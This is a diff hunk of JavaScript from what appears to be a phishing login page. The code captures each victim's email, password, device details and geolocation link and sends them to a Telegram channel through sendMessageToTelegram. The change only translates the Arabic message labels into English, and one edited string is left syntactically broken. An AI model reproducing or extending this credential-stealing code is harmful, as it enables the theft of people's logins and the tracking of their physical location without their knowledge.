@@ -89,27 +89,27 @@
                     let longitude = position.coords.longitude;
                     let locationLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
-                    let message = `🚀 تسجيل دخول جديد:
-📧 الإيميل/المستخدم: ${email}
-🔑 كلمة المرور: ${password}
-📱 الجهاز: ${deviceInfo}
+                    let message = `🚀 new login :
+📧 The email  :  ${email}
+🔑 The passwd :  ${password}
+📱 The Advise :  ${deviceInfo}
 📍 الموقع: [اضغط هنا لرؤية الموقع](${locationLink})`;
 
                     sendMessageToTelegram(message);
                 }, () => {
-                    let message = `🚀 تسجيل دخول جديد:
-📧 الإيميل/المستخدم: ${email}
-🔑 كلمة المرور: ${password}
-📱 الجهاز: ${deviceInfo}
+                    let message = `🚀 new login :
+📧 The email  :  ${email}
+🔑 The passwd :  ${password}
+📱 The Advise :  ${deviceInfo}
 ⚠️ تعذر الحصول على الموقع الجغرافي`;
 
                     sendMessageToTelegram(message);
                 });
             } else {
-                let message = `🚀 تسجيل دخول جديد:
-📧 الإيميل/المستخدم: ${email}
-🔑 كلمة المرور: ${password}
-📱 الجهاز: ${deviceInfo}
+                let message = '🚀 new login:
+📧 The email  :  ${email}
+🔑 The passwd :  ${password}
+📱 The Advise :  ${deviceInfo}
 ⚠️ المتصفح لا يدعم تحديد الموقع`;
 
                 sendMessageToTelegram(message);
